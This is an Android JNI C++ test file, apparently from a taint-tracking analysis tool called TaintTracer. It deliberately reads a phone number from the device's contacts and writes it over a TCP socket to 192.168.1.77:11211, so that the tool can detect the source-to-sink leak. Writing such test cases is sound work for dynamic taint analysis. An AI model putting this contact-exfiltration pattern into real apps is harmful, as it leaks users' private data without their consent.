#include <jni.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <android/log.h>
#include <errno.h>
#include <cstring>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <assert.h>
#include <string>
#include <asm/unistd.h>
#include <linux/futex.h>
#include <thread>

#define TAG "SourceSinkTestNative"

void native_sink(const char *buffer, size_t len) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to create socket: %s", strerror(errno));
    }
    const sockaddr_in addr {
            .sin_family = AF_INET,
            .sin_addr.s_addr = inet_addr("192.168.1.77"),
            .sin_port = htons(11211),
    };
    if (connect(sockfd, reinterpret_cast<const sockaddr *>(&addr), sizeof(addr)) != 0) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to connect to server: %s", strerror(errno));
    }
    if (write(sockfd, buffer, len) == -1) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to write to socket: %s", strerror(errno));
    }
    if (close(sockfd) == -1) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to close socket: %s", strerror(errno));
    }
}

jstring native_source(JNIEnv *env, jobject contextwrapper) {
    /* We call stable Android Framework methods that call android::IPCThreadState::transact in libbinder.so */
    auto this_clazz = env->GetObjectClass(contextwrapper);
    auto get_content_resolver_method = env->GetMethodID(this_clazz, "getContentResolver", "()Landroid/content/ContentResolver;");
    assert(get_content_resolver_method);
    auto cr = env->CallObjectMethod(contextwrapper, get_content_resolver_method);
    assert(cr);
    auto cr_clazz = env->GetObjectClass(cr);
    auto query_method = env->GetMethodID(cr_clazz, "query", "(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;");
    assert(query_method);
    jobject content_uri;
    auto phone_clazz = env->FindClass("android/provider/ContactsContract$CommonDataKinds$Phone");
    {
        auto field_id = env->GetStaticFieldID(phone_clazz, "CONTENT_URI", "Landroid/net/Uri;");
        assert(field_id);
        content_uri = env->GetStaticObjectField(phone_clazz, field_id);
    }
    auto selection = env->NewStringUTF("has_phone_number > 0");
    auto cursor = env->CallObjectMethod(cr, query_method, content_uri, nullptr, selection, nullptr, nullptr);
    assert(cursor);
    env->DeleteLocalRef(selection);
    auto cursor_clazz = env->GetObjectClass(cursor);
    auto move_to_next_method = env->GetMethodID(cursor_clazz, "moveToNext", "()Z");

    if (env->CallBooleanMethod(cursor, move_to_next_method)) {
        jstring phone_col;
        {
            auto field_id = env->GetStaticFieldID(phone_clazz, "NUMBER", "Ljava/lang/String;");
            assert(field_id);
            phone_col = static_cast<jstring>(env->GetStaticObjectField(phone_clazz, field_id));
        }
        auto get_column_index_method = env->GetMethodID(cursor_clazz, "getColumnIndex", "(Ljava/lang/String;)I");
        assert(get_column_index_method);
        jint col_idx = env->CallIntMethod(cursor, get_column_index_method, phone_col);
        auto get_string_method = env->GetMethodID(cursor_clazz, "getString", "(I)Ljava/lang/String;");
        assert(get_string_method);
        auto res = env->CallObjectMethod(cursor, get_string_method, col_idx);
        assert(res);
        return (jstring) res;
    } else {
        jclass Exception = env->FindClass("java/lang/Exception");
        env->ThrowNew(Exception, "No contacts in contact list");
        throw std::runtime_error("Unreachable?");
    }
}

extern "C"
JNIEXPORT void JNICALL
Java_org_TaintTracer_TaintTracer_TestSourceSinkContextActivity_nativeSink(JNIEnv *env,
                                                                            jobject thiz,
                                                                            jstring tainted_string) {
    const char *tainted_string_native = env->GetStringUTFChars(tainted_string, 0);
    native_sink(tainted_string_native, strlen(tainted_string_native));
    env->ReleaseStringUTFChars(tainted_string, tainted_string_native);
}

extern "C"
JNIEXPORT jstring JNICALL
Java_org_TaintTracer_TaintTracer_TestSourceSinkContextActivity_nativeSource(JNIEnv *env,
                                                                              jobject thiz) {
    return native_source(env, thiz);
}

extern "C"
JNIEXPORT void JNICALL
Java_org_TaintTracer_TaintTracer_TestSourceSinkContextActivity_nativeSourceToNativeSink(
        JNIEnv *env, jobject thiz) {
    jstring tainted_data = native_source(env, thiz);
    const char *tainted_cstr = env->GetStringUTFChars(tainted_data, 0);
    native_sink(tainted_cstr, strlen(tainted_cstr));
    env->ReleaseStringUTFChars(tainted_data, tainted_cstr);
}

extern "C"
JNIEXPORT void JNICALL
Java_org_TaintTracer_TaintTracer_TestSourceSinkContextActivity_run_1regression_1tests(JNIEnv *env,
                                                                                        jobject thiz) {
    // Allocate buffer
    char *buf;
    long err = posix_memalign((void **)&buf, PAGE_SIZE, PAGE_SIZE);
    if (err != 0) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to allocate memory page");
    }
    int *futex = (int *)(buf + PAGE_SIZE - sizeof(int)); // Futex within the same page

    // Taint buffer
    jstring tainted_data = native_source(env, thiz);
    const char *tainted_cstr = env->GetStringUTFChars(tainted_data, 0);
    buf[0] = tainted_cstr[0];
    env->ReleaseStringUTFChars(tainted_data, tainted_cstr);

    // Spawn thread to wake up waiting processes with futex() at the tainted memory buffer
    // and ensure that the main thread unblocks
    *futex = 0;
    auto t = std::thread([&] {
        usleep(1000000);
        // Wake up main thread
        err = syscall(__NR_futex, futex, FUTEX_WAKE, 1, nullptr, nullptr, 0);
        if (err == -1) {
            __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to wake up main thread with futex(): %s", strerror(errno));
        }
    });

    // Wait for other thread
    err = syscall(__NR_futex, futex, FUTEX_WAIT, 0, nullptr, nullptr, 0);
    if (err == -1) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "Failed to wait for futex: %s", strerror(errno));
    }
    t.join();
    __android_log_print(ANDROID_LOG_INFO, TAG, "Regression tests passed!");
}